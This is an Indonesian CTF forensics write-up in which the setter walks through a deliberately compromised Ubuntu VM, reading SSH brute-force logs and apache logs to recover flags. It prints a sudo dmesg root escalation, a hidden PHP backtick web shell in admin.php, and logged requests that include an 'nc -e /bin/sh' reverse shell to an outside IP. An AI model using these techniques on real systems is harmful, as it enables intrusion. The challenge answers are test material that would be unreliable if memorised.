# Write UP _KKS - TNI AD CTF 2020_ Forensic VM

**اَلسَّلَامُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَا تُهُ** / **بِسْمِ اللّهِ الرَّحْمَنِ الرَّحِيْمِ** Di sini saya mau berbagi prespektif as Probsetter dan as Solver di tulisan kali ini. Ternyata banyak yang terjadi ya, teman-teman yang ikut kompetisinya pasti sudah tau lah di depan layar apa yang terjadi. Untuk belakang layar? Someday para panita akan saya ajak bercerita.



Soal kategori Forensic ini menurut saya lumayan baru atau bahkan jarang(?) di *scene* CTF di Indonesia? Apa gak juga ya PD banget sih aku */Pukul diri sendiri*.  Tapi konsep challengenya adalah sebagai probset, saya sedang banyak-banyaknya mengembangkan sebuah VM yang digunakan untuk mengajar atau sekedar untuk kebutuhan lainnya seperti Deploy di kantor. Jadi saat mau bikin soal Forensic ini kepikiran. "Ah gimana kalau peserta diberikan sebuah skenario VM yang telah di-hack ya".  Lalu setelah kepikiran hal tersebut, saya mendiskusikan dengan mas @kod0kk probset satunya dan bilang "Aman" ????????????????? Aneh bener jadi manusia. 



## Tujuan Challenge

VM Forensic ini juga memiliki tujuan untuk tiap-tiap peserta.

1. Memahami stuktur dasar VM Linux
2. Peserta mampu memahami deskripsi masalah
3. *Privilege Escalation*
4. WASTING CONTESTANTS TIME

Dari 4 Point di atas point utamanya adalah nomer 4. Yang mana tujuan itu dibuat karena perlombaannya selama 2 hari, meskipun akhirnya memang 2 hari karena ya begitulah teman-teman yang ikut pasti sudah paham. Kenapa bisa wasting time? Karena informasi detail tentang VM tidak diberikan, password ZIP juga tidak diberikan meskipun sangat cepat proses *Cracking*-nya. Ada hal-hal lainnya yaitu, ukuran VM yang relatif besar yaitu hampir 2Gb, tapi hal ini sudah dapat diatasi karena VM dibagikan H-1 Perlombaan dimulai.



## Informasi dasar VM

```sh
root@kkst2020:~$ uname -a
Linux kkst2020 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@kkst2020:~$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"
```

Di dalam VM tersedia 2 user

1. guest
2. hack

User `guest` adalah user yang diberikan kepada peserta di awal booting VMnya. Dengan *credential* `guest:guest` sedangkan user `hack` adalah user yang tersedia, namun tidak diberikan passwordnya.



Link Download: 

https://drive.google.com/file/d/11eTVayk9bZ4nMnFM9nQS9D4CD4DDr1XA/view



## Problem yang disajikan

Pada *Challenge* kali ini saya ingin membuat peserta lebih banyak membaca deskripsi soal, lalu merencanakan langkah mitigasinya. Karena kita sebagai manusia harus اِقْرَأْ  (96:1)  Setiap *Challenge* harusnya dapat dikerjakan dengan mudah, jika kita mengerjakan berurutan soal per soal. Namun *something unpredictable happend* saya lalai pada 1 soal yang mana sebenarnya tidak mempengaruhi stuktur pengerjaan soal. Hanya saja capaian yang diinginkan tidak terjadi.



Lalu untuk tiap-tiap *Challenge* saya ingin membuat peserta memahami:

1. Tipe serangan

Dalam tipe serangan ini, saya ingin secara pribadi peserta memahami jika ada *Module x* digunakan untuk menyerang, maka kita harus melakukan pengecekan pada Log *Y*.

2. Internal tools 

Ada beberapa soal yang sebenarnya hanya memerlukan internal tools dari linux itu sendiri untuk menyelesaikan atau bahkan untuk mencari hal-hal yang diperlukan.

3. Aware about something happend

Maksudnya adalah, saya ingin peserta memposisikan dirinya adalah sebagai orang yang harus menginvestigasi VM tersebut dengan data yang seminim mungkin dan dapat diterjemahkan sendiri menjadi sebuah informasi yang berharga.



## Deskripsi soal

Judul: Siapa yang melakukan?
Deskripsi: VM yang telah diberikan adalah VM yang telah di-Hack oleh seseorang yang berhati kurang baik. Kami mengidentifikasi bahwa Attacker menggunakan Modul auxiliary/scanner/ssh/ssh_login. Dapatkah kamu mengindentifkasi log-log yang berkaitan dengan serangan dengan modul tersebut?

Capaian: Terpenuhi, karena hampir semua peserta mengerjakan sesuai skenario saya.



Judul: Dia Jahil!

Deskripsi: Kami menyadari, attacker ini cukup usil dengan merubah salah satu file web kami. Web masih berjalan dengan normal bagi kami, namun kami kawathir ada file yang berubah. Tolong carikan file apa yang berubah itu. Submit dengan KKST2020{namafile}. Kamu hanya punya 3 kali kesempatan untuk Submit.

Capaian: Tidak Terpenuhi, karena adanya kesalahan saya lupa melakukan `touch` pada file yang diubah.



Judul: Ke mana dia kembali?

Deskripsi: Setelah melakukan analisa pada SOC kami, ada aktivitas mencurigakan dari VM yang melakukan Back Connect ke server lain. Dia sepertinya menggunakan cara tradisional untuk melakukan Back Connect. Jadi di alamat IP mana dan PORT berapa attacker melakukan Back Connect? Submit dengan KKST2020{ip:port}. Kamu hanya punya 3 kali kesempatan untuk Submit.

Capaian: Terpenuhi, karena hampir semua peserta mengerjakan sesuai skenario saya.



Judul: Keberuntungan

Deksripsi: Attacker sudah tertangkap, kami mengintrogasinya. Dan kami terkaget-kaget saat mendengar dia menitipkan sebuah Backdoor Portable Executable di VM tersebut. Bantu kami menganalisa di mana tempat dia menyimpan Backdoor tersebut. Dan beritau kami server ip dan port mana yang dia gunakan di backdoor tersebut. Submit dengan KKST2020{pathfile:ip:port}. Kamu hanya punya 3 kali kesempatan untuk Submit.

Capaian: Sangat terpenuhi, semua mengerjakan dengan cara yang beragam, dan sangat memenuhi ekspetasi saya.



# Official Write UP

Write UP ini adalah cara penyelesaian soal yang saya harapkan, menurut saya semua soal terkecuali `Dia Jahil!` sudah dikerjakan sesuai ekspetasi saya.



### Siapa yang melakukan?

Kata kunci dari problemnya adalah `Modul auxiliary/scanner/ssh/ssh_login` yang mana modul ini digunakan untuk brute force SSH service sebuah target. Bertati jika menggunakan modul tersebut, machine tersebut sudah pasti memiliki kerentanan yaitu `Weak Password`.  Lalu karena adannya brute force SSH, maka kita dapat mengecek `/var/log/auth.log` untuk mendapatkan infromasi username apa saja yang digunakan ataupun `ip` attackernya. Namun ada sebuah masalah yaitu permission untuk membaca `auth.log` tidak tersedia bagi user `guest`. 



```sh
guest@kkst2020:~$ ls -la /var/log/auth.log
-rw-r----- 1 syslog adm 2465 Nov 27 07:25 /var/log/auth.log
guest@kkst2020:~$ cat /var/log/auth.log
cat: /var/log/auth.log: Permission denied
guest@kkst2020:~$
```



Lalu? Problem ini dapat selesai dengan melakukan cara yang sama yaitu brute force dengan menggunakan publik wordlist ke user `hack`.  Atau kita dapat melakukan privilege escalation dengan cara.



```sh
guest@kkst2020:~$ sudo -l
Matching Defaults entries for guest on kkst2020:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User guest may run the following commands on kkst2020:
    (ALL) NOPASSWD: /bin/dmesg
guest@kkst2020:~$
```

Di situ terdapat sebuah sudoers no passwd ke sebuah utility `dmesg` yang mana dapat kita abuse menjadi root dengan cara.

```sh
$ sudo /bin/dmesg -H
!/bin/bash
```

Tara dengan begitu akan menjadi user `root`

```sh
root@kkst2020:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Setelah menjadi `root` kita akan membaca `/var/log/auth.log` yang mana jika serangannya adalah brute force, maka kita dapat melakukan filter.

1. Mencari user failed
2. Mencari password failer



```sh
root@kkst2020:~# grep 'Failed password' /var/log/auth.log -a
Nov  9 02:48:12 kkst2020 sshd[1207]: Failed password for invalid user K from 192.168.77.87 port 65141 ssh2
Nov  9 02:48:23 kkst2020 sshd[1217]: Failed password for invalid user K from 192.168.77.87 port 65142 ssh2
Nov  9 02:48:34 kkst2020 sshd[1219]: Failed password for invalid user S from 192.168.77.87 port 65143 ssh2
Nov  9 02:48:39 kkst2020 sshd[1221]: Failed password for invalid user T from 192.168.77.87 port 65144 ssh2
Nov  9 02:51:21 kkst2020 sshd[1227]: Failed password for invalid user 2020 from 192.168.77.87 port 65149 ssh2
Nov  9 02:51:23 kkst2020 sshd[1227]: Failed password for invalid user 2020 from 192.168.77.87 port 65149 ssh2
Nov  9 03:02:00 kkst2020 sshd[1255]: Failed password for invalid user L00K from 192.168.77.87 port 65156 ssh2
Nov  9 03:02:07 kkst2020 sshd[1258]: Failed password for invalid user L00K from 192.168.77.87 port 65158 ssh2
Nov  9 03:02:58 kkst2020 sshd[1261]: Failed password for invalid user _H3rS from 192.168.77.87 port 65159 ssh2
Nov  9 03:03:40 kkst2020 sshd[1264]: Failed password for invalid user _ from 192.168.77.87 port 65162 ssh2
Nov  9 03:16:09 kkst2020 sshd[1334]: Failed password for invalid user Ch3ck from 192.168.77.87 port 65174 ssh2
Nov  9 03:16:12 kkst2020 sshd[1334]: Failed password for invalid user Ch3ck from 192.168.77.87 port 65174 ssh2
Nov  9 03:16:23 kkst2020 sshd[1338]: Failed password for invalid user Ch3ck} from 192.168.77.87 port 65175 ssh2
Nov  9 03:16:31 kkst2020 sshd[1341]: Failed password for invalid user Ch3ck} from 192.168.77.87 port 65177 ssh2
```

Seperti yang terlihat sudah ada potongan Flagnya.

FLAG = **KKST2020{L00K_H3rS_Ch3ck}**



### Dia Jahil!

Soal ini sebenarnya sangat cukup menyita waktu dan bisa dikategorikan sulit. Namun adanya kesalahan dari saya yang lupa re-`touch` file yang saya edit, jadi begitulah. Karena tujuan yang dibahas adalah sebuah website, maka tujuan kita adalah folder `/var/www/html`. Karena yang ditanyakan file apa yang kemungkinan dirubah atau berubah maka caranya kita tinggal `ls -latr` . 



```sh
root@kkst2020:/var/www/html# ls -lat
total 52
drwxr-xr-x 2 root root 4096 Nov 17 01:26 proses
drwxr-xr-x 6 root root 4096 Nov  9 05:02 .
-rw-r--r-- 1 root root  743 Nov  9 05:01 pemodal.php
drwxrwxrwx 2 root root 4096 Nov  9 04:59 admin
drwxr-xr-x 6 root root 4096 Nov  9 04:57 style
drwxr-xr-x 4 root root 4096 Nov  9 04:57 gambar
-rw-r--r-- 1 root root 6782 Nov  9 04:57 index.html
-rw-r--r-- 1 root root  652 Nov  9 04:57 lahan.php
-rw-r--r-- 1 root root  931 Nov  9 04:57 pemilik_lahan.php
-rw-r--r-- 1 root root 5221 Nov  9 04:57 desain.php
drwxr-xr-x 3 root root 4096 Nov  9 02:39 ..
```

Di situ terlihat bahwa folder `proses` mengalami perubahan pada tanggal 17. 

```sh
root@kkst2020:/var/www/html# ls -lat proses/
total 28
drwxr-xr-x 2 root root 4096 Nov 17 01:26 .
-rwxr-xr-x 1 root root  152 Nov 17 01:26 koneksi.php
drwxr-xr-x 6 root root 4096 Nov  9 05:02 ..
-rw-r--r-- 1 root root  742 Nov  9 04:57 daftar_pemilik.php
-rw-r--r-- 1 root root  542 Nov  9 04:57 daftar_pemodal.php
-rw-r--r-- 1 root root  675 Nov  9 04:57 lahan.php
-rwxr-xr-x 1 root root  641 Nov  9 04:57 loginAdmin.php
root@kkst2020:/var/www/html#
```

Di situ terlihat bahwa `koneksi.php` yang berubah. Terlalu mudah bukan? Seharunya jika `touch` sampai dilakukan maka ekspetasi solvingnya akan seperti ini. Karena kita dibatasi hanya ada 3 kali submit jawaban, maka kita harus mencari sebuah pembanding atau data yang valid terkait stuktur file awal. Di dalam folder `/var/backups` ada sebuah backup folder `/var/www/html` sebelum attacker menyerang.



```sh
root@kkst2020:/var/www/html# ls -lat /var/backups/
total 7768
drwxr-xr-x  2 root root      4096 Nov 27 06:25 .
-rw-r--r--  1 root root     71680 Nov 27 06:25 alternatives.tar.0
-rw-r--r--  1 root root     36963 Nov 23 04:17 apt.extended_states.0
-rw-r--r--  1 root root    649722 Nov 23 04:17 dpkg.status.0
-rw-r--r--  1 root root      3935 Nov 17 01:35 apt.extended_states.1.gz
-rw-r--r--  1 root root   6832412 Nov  9 05:02 bu.zip
-rw-r--r--  1 root root       207 Nov  9 02:39 dpkg.statoverride.0
-rw-------  1 root shadow     597 Nov  9 02:39 gshadow.bak
-rw-------  1 root root       716 Nov  9 02:39 group.bak
drwxr-xr-x 14 root root      4096 Nov  9 02:39 ..
-rw-r--r--  1 root root      3885 Sep  2 01:28 apt.extended_states.2.gz
-rw-------  1 root root      1600 Aug 30 10:00 passwd.bak
-rw-------  1 root shadow    1059 Aug 30 10:00 shadow.bak
-rw-r--r--  1 root root      2094 Aug 26 06:25 alternatives.tar.1.gz
-rw-r--r--  1 root root    142488 Aug 26 03:22 dpkg.status.1.gz
-rw-r--r--  1 root root    142488 Aug 26 03:22 dpkg.status.2.gz
-rw-r--r--  1 root root        42 Aug 26 03:22 apt.extended_states.3.gz
-rw-r--r--  1 root root       437 Aug 26 03:17 dpkg.diversions.0
-rw-r--r--  1 root root       202 Aug 26 03:17 dpkg.diversions.1.gz
-rw-r--r--  1 root root       202 Aug 26 03:17 dpkg.diversions.2.gz
-rw-r--r--  1 root root       129 Aug  6 22:39 dpkg.statoverride.1.gz
-rw-r--r--  1 root root       129 Aug  6 22:39 dpkg.statoverride.2.gz
```



Pada file `bu.zip` idenya kita harus melakukan `extract` dan mulai melakukan `md5` compare dengan `md5` dari `/var/www/html` yang sekarang. Caranya ini sedikit rumit ini, karena kita perlu mencari file backups-nya saja. 



Flag = **KKST2020{koneksi.php}**



### Ke mana dia kembali?

Fokus *challenge* ini adalah untuk menemukan ip:port yang digunakan attacker untuk melakukan backconnect. Dan yang menjadi highlight untuk *challenge* ini adalah alat Tradisional untuk backconnect. Alat yang dimaksud bisa berupa `/bin/tcp`, `nc` atau bahkan bahasa pemrogramman. Proses identifikasi ini akan dipermudah jika tiap-tiap peserta telah menganalisa tiap-tiap file yang berada pada `/var/www/html/admin` terdapat sebuah `backdoor` sebagai berikut.



```sh
root@kkst2020:/var/www/html/admin# ls -lat
total 16
drwxr-xr-x 6 root root 4096 Nov  9 05:02 ..
drwxrwxrwx 2 root root 4096 Nov  9 04:59 .
-rwxr-xr-x 1 root root  132 Nov  9 04:58 admin.php
-rwxr-xr-x 1 root root  670 Nov  9 04:57 adminLogin.php
root@kkst2020:/var/www/html/admin# cat admin.php
<?php
session_start();
$nama = $this->$_SESSION->$data['nama'];`$_GET[0]`;

echo $nama;
?>
<h1>selamat datang di halaman admin</h1>
root@kkst2020:/var/www/html/admin#
```



Terlihat pada file `admin.php` terdapat sebuah hidden backdoor. Maka kita tinggal melakukan pengecekan pada log apache terhadap file `admin.php`



```sh
root@kkst2020:/var/www/html/admin# grep -e 'admin.php?0=' /var/log/apache2/access.log
192.168.77.41 - - [17/Nov/2020:01:40:16 +0000] "GET /admin/admin.php?0=id HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:01:40:23 +0000] "GET /admin/admin.php?0=echo%201; HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:01:43:10 +0000] "GET /admin/admin.php?0=ls%20-la%20%3E%20asd HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:01:43:20 +0000] "GET /admin/admin.php?0=ls%20-la%20%3E%20asd HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:01:49:10 +0000] "GET /admin/admin.php?0=nc%20-e%20/bin/sh%20157.1.12.12%201399 HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:15:29 +0000] "GET /admin/admin.php?0=nc%20-lvp%201330 HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:17:43 +0000] "GET /admin/admin.php?0=nc%20999 HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:17:54 +0000] "GET /admin/admin.php?0=nc%20nc%20nc%20nc%20nc%20nc HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:22:54 +0000] "GET /admin/admin.php?0=nc%20nc%20nc%20nc%20nc%20nc HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:22:54 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://192.168.77.39/admin/admin.php?0=nc%20nc%20nc%20nc%20nc%20nc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
```



Disitu terlihat banyak sekali aktivitas dari seseorang. Kita dapat melakukan shorting lebih dalam karena sudah terlihat banyak string `nc`.



```sh
root@kkst2020:/var/www/html/admin# grep -e 'admin.php?0=nc' /var/log/apache2/access.log
192.168.77.41 - - [17/Nov/2020:01:49:10 +0000] "GET /admin/admin.php?0=nc%20-e%20/bin/sh%20157.1.12.12%201399 HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:15:29 +0000] "GET /admin/admin.php?0=nc%20-lvp%201330 HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:17:43 +0000] "GET /admin/admin.php?0=nc%20999 HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:17:54 +0000] "GET /admin/admin.php?0=nc%20nc%20nc%20nc%20nc%20nc HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:22:54 +0000] "GET /admin/admin.php?0=nc%20nc%20nc%20nc%20nc%20nc HTTP/1.1" 500 295 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
192.168.77.41 - - [17/Nov/2020:02:22:54 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://192.168.77.39/admin/admin.php?0=nc%20nc%20nc%20nc%20nc%20nc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
```



Terlihat pada result paling atas, system melakukan requests `nc` . Dapat didecode dengan url-decode dan hasilnya adalah.

```sh
/admin/admin.php?0=nc -e /bin/sh 157.1.12.12 1399HTTP/1.1"500295"-""Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:82.0)Gecko/20100101Firefox/82.0"
```



flag = **KKST2020{157.1.12.12:1399}**